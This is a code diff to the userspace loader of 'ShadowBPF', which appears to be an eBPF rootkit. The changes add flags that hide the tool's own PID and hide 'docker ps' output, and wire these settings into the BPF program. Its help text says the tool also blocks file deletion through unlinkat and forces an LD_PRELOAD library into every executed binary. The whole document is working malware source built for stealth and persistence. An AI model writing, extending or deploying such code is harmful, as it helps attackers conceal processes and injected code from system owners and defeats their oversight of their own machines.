@@ -84,21 +84,28 @@ static int handle_event(void *ctx, void *data, size_t data_sz)
 
 static struct env {
     char ld_preload[LD_PRELOAD_MAX_LEN];
+    char pid_to_hide[MAX_PID_LEN];
+    char hide_docker_ps;
 } env;
 
 const char *argp_program_version = "shadow 1.0";
 const char argp_program_doc[] =
 "ShadowBPF\n"
 "\n"
-"Removes output from docker -ps, hides pid, destroys unlinkat and LD_PRELOAD every execve'd binary\n"
-"USAGE ./shadow -l 'LD_PRELOAD string'\n"
+"Removes output from docker -ps, hides pid, destroys unlinkat to disable removing files :) and LD_PRELOAD every execve'd binary\n"
+"\n"
+"USAGE ./shadow -p -l 'LD_PRELOAD string'\n"
 "EXAMPLES:\n"
-"LD_PRELOAD fakelib:\n"
-"   ./shadow -l 'LD_PRELOAD=/path/to/fakelib.so'"
+"LD_PRELOAD fakelib and hide PID:\n"
+"   ./shadow -p -l 'LD_PRELOAD=/path/to/fakelib.so'\n"
+"hide docker ps output:\n"
+"   ./shadow -d\n"
 "";
 
 static const struct argp_option opts[] = {
     {"ld_preload", 'l', "LD_PRELOAD", 0, "Full LD_PRELOAD string"},
+    {"hide-pid", 'p', 0, 0, "Hide the PID of shadow"},
+    {"hide-docker-ps", 'd', 0, 0, "Hide output from 'docker ps'"},
     {},
 };
 
@@ -111,6 +118,13 @@ static error_t parse_arg(int key, char *arg, struct argp_state *state)
                 argp_usage(state);
             }
             strncpy(env.ld_preload, arg, strlen(arg));
+            break;
+        case 'p':
+            int pid = getpid();
+            sprintf(env.pid_to_hide, "%d", pid);
+            break;
+        case 'd':
+            env.hide_docker_ps = 1;
             break;
         case ARGP_KEY_ARG:
             argp_usage(state);
@@ -126,8 +140,6 @@ static const struct argp argp = {
     .parser = parse_arg,
     .doc = argp_program_doc,
 };
-
-int g_pid;
 
 int main(int argc, char *argv[])
 {
@@ -151,14 +163,14 @@ int main(int argc, char *argv[])
     }
 
     /* pass in our pid to be hidden */
-    char pid_to_hide[MAX_PID_LEN] = { 0 };
-    g_pid = getpid();
-    sprintf(pid_to_hide, "%d", g_pid);
-    strncpy(skel->rodata->pid_to_hide, pid_to_hide, sizeof(skel->rodata->pid_to_hide));
-    skel->rodata->pid_to_hide_len = strlen(pid_to_hide) + 1;
+    strncpy(skel->rodata->pid_to_hide, env.pid_to_hide, sizeof(skel->rodata->pid_to_hide));
+    skel->rodata->pid_to_hide_len = strlen(env.pid_to_hide) + 1;
 
-    /* pass in our ld_preload if given one */
+    /* pass in our ld_preload */
     strncpy(skel->rodata->ld_preload, env.ld_preload, sizeof(skel->rodata->ld_preload));
+
+    /* pass in wether to hide docker ps output */
+    skel->rodata->hide_docker_ps = env.hide_docker_ps;
 
     /* load and verify BPF program */
     err = shadow_bpf__load(skel);
@@ -222,7 +234,7 @@ int main(int argc, char *argv[])
     }
 
     printf("Successfully started!\n"); 
-    printf("PID: %d\n", g_pid);
+    printf("PID: %d\n", getpid());
 
     while (!exiting) {
         err = ring_buffer__poll(rb, 100 /* timeout, ms */);
